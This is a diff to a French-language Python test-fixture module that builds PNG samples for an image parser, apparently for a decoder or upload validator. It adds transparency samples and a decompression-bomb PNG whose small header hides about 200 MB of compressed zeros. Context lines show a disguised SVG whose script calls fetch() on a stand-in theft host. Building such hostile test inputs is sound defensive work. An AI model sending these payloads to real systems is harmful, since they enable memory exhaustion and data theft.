@@ -120,6 +120,37 @@ def seize_bits(cote: int = 32) -> bytes:
     return png(largeur=cote, hauteur=cote, type_couleur=2, profondeur=16, lignes=lignes)
 
 
+def gris_avec_trns(cote: int = 32) -> bytes:
+    """Gris 8 bits dont le noir est déclaré transparent par `tRNS`."""
+    lignes = [bytes((0 if x % 2 else 200) for x in range(cote)) for _ in range(cote)]
+    return png(
+        largeur=cote,
+        hauteur=cote,
+        type_couleur=0,
+        profondeur=8,
+        lignes=lignes,
+        transparence=bytes([0, 0]),  # deux octets gros-boutistes : la valeur 0
+    )
+
+
+def rvb_avec_trns(cote: int = 32) -> bytes:
+    """RVB 8 bits dont le rouge pur est déclaré transparent par `tRNS`."""
+    lignes = []
+    for _ in range(cote):
+        ligne = bytearray()
+        for x in range(cote):
+            ligne += bytes([255, 0, 0] if x % 2 else [0, 0, 255])
+        lignes.append(bytes(ligne))
+    return png(
+        largeur=cote,
+        hauteur=cote,
+        type_couleur=2,
+        profondeur=8,
+        lignes=lignes,
+        transparence=bytes([0, 255, 0, 0, 0, 0]),  # trois entiers 16 bits : 255,0,0
+    )
+
+
 def entrelace(cote: int = 32) -> bytes:
     """Adam7 — refusé, et le refus doit le nommer."""
     lignes = [bytes([120] * (cote * 3)) for _ in range(cote)]
@@ -139,3 +170,27 @@ SVG_DEGUISE = (
     b'<script>fetch("https://exemple.invalid/vol")</script>'
     b'<rect width="64" height="64" fill="red"/></svg>'
 )
+
+
+def bombe_de_decompression(octets_developpes: int = 200 * 1024 * 1024) -> bytes:
+    """Un PNG dont l'IHDR annonce 16×16 et dont l'IDAT porte des mégaoctets.
+
+    Rien n'oblige les données d'image à correspondre à l'en-tête. Le plafond
+    posé sur la TAILLE DU FICHIER ne borne donc pas la mémoire développée :
+    DEFLATE comprime une suite de zéros à environ mille pour un. Deux
+    mégaoctets d'IDAT portent deux gigaoctets.
+
+    Le fichier rendu pèse quelques centaines de kilooctets.
+    """
+    comprimeur = zlib.compressobj(9)
+    morceaux = []
+    bloc = bytes(1024 * 1024)
+    for _ in range(octets_developpes // len(bloc)):
+        morceaux.append(comprimeur.compress(bloc))
+    morceaux.append(comprimeur.flush())
+    return (
+        b"\x89PNG\r\n\x1a\n"
+        + _morceau(b"IHDR", struct.pack(">IIBBBBB", 16, 16, 8, 0, 0, 0, 0))
+        + _morceau(b"IDAT", b"".join(morceaux))
+        + _morceau(b"IEND", b"")
+    )
